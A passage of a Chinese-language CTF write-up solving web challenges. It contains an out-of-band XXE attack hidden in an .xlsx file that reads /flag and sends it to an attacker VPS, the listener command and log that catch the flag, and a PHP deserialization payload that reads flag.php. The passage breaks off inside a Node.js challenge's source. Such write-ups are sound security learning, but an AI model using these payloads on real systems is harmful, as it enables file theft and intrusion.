class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//UploadServlet.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileUploadException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Sheet;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Workbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UploadServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String savePath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">        String tempPath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/temp"</span>);</span><br><span class="line">        File tempFile = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!tempFile.exists()) &#123;</span><br><span class="line">            tempFile.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String message = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">            factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">            factory.setRepository(tempFile);</span><br><span class="line">            ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line">            upload.setHeaderEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">            upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">            upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">            <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            List&lt;FileItem&gt; list = upload.parseRequest(request);</span><br><span class="line">            Iterator var10 = list.iterator();</span><br><span class="line"></span><br><span class="line">            label56:</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!var10.hasNext()) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label56;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    FileItem fileItem = (FileItem)var10.next();</span><br><span class="line">                    String filename;</span><br><span class="line">                    String fileExtName;</span><br><span class="line">                    <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">                        filename = fileItem.getFieldName();</span><br><span class="line">                        fileExtName = fileItem.getString(<span class="string">"UTF-8"</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filename = fileItem.getName();</span><br><span class="line">                        <span class="keyword">if</span> (filename != <span class="keyword">null</span> &amp;&amp; !filename.trim().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                            fileExtName = filename.substring(filename.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">                            InputStream in = fileItem.getInputStream();</span><br><span class="line">                            <span class="keyword">if</span> (filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                    Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                    System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                                    System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">                                    var20.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            String saveFilename = <span class="keyword">this</span>.makeFileName(filename);</span><br><span class="line">                            request.setAttribute(<span class="string">"saveFilename"</span>, saveFilename);</span><br><span class="line">                            request.setAttribute(<span class="string">"filename"</span>, filename);</span><br><span class="line">                            String realSavePath = <span class="keyword">this</span>.makePath(saveFilename, savePath);</span><br><span class="line">                            FileOutputStream out = <span class="keyword">new</span> FileOutputStream(realSavePath + <span class="string">"/"</span> + saveFilename);</span><br><span class="line">                            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                            <span class="keyword">boolean</span> var19 = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">int</span> len;</span><br><span class="line">                            <span class="keyword">while</span>((len = in.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            in.close();</span><br><span class="line">                            out.close();</span><br><span class="line">                            message = <span class="string">"文件上传成功!"</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileUploadException var21) &#123;</span><br><span class="line">            var21.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        request.setAttribute(<span class="string">"message"</span>, message);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">"/ListFileServlet"</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makeFileName</span><span class="params">(String filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> UUID.randomUUID().toString() + <span class="string">"_"</span> + filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makePath</span><span class="params">(String filename, String savePath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">        <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">240</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        String dir = savePath + <span class="string">"/"</span> + dir1 + <span class="string">"/"</span> + dir2;</span><br><span class="line">        File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                    Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                    System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                                    System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">                                    var20.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br></pre></td></tr></table></figure><p>是excel的xxe。还得数据外带</p><p>使用vps 在本地写个1文件内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;flag&#39;&gt;</span><br><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:5555&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>创建一个xlsx文件，使用压缩文件打开，将里面的[Content_Types].xml解压，在第二行添加如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE any [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;174.1.62.113:5555&#x2F;1&quot;&gt;%remote;%payload;%send;]&gt;</span><br></pre></td></tr></table></figure><p>并替换压缩包内文件（<strong>不要解压</strong>，直接替换Content_Types.xml）然后在vps上在文件1所在目录执行命令启动零时web服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:5555</span><br></pre></td></tr></table></figure><p>等待接受文件即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@2c51daa62fd1:~# [Mon May 11 11:40:56 2020] *.*.*.*:52204 [200]: &#x2F;1</span><br><span class="line">[Mon May 11 11:40:56 2020] *.*.*.*:52208 [404]: &#x2F;flag&#123;55ac2090-a7cb-438f-a636-2d5ea530d387&#125; - No such file or directory</span><br></pre></td></tr></table></figure><h2 id="青龙组AreUSerialz"><a href="#青龙组AreUSerialz" class="headerlink" title="青龙组AreUSerialz"></a>青龙组AreUSerialz</h2><p>打开题目就有源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到最后上序列化漏洞，还有过滤，只能使用ascii32-125的字符，protect序列化会有%00。之前有过<a href="">一个题目</a> 过滤了%使用<code>S</code>代替<code>s</code>，序列化字符串时<code>%00*%00</code>就回替换为<code>\00*\00</code>，在此处选择protect转换为public，将FileHandler属性内容改大</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line">$a-&gt;op=<span class="number">2</span>;</span><br><span class="line">$a-&gt;filename=<span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);  <span class="comment">//O:11:"FileHandler":2:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>查看源码即可获得flag<br>更多解法参考<a href="https://www.gem-love.com/websecurity/2322.html" target="_blank" rel="noopener">颖齐师傅博客</a></p><h2 id="青龙组-notes"><a href="#青龙组-notes" class="headerlink" title="青龙组 notes"></a>青龙组 notes</h2><p>给出了源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    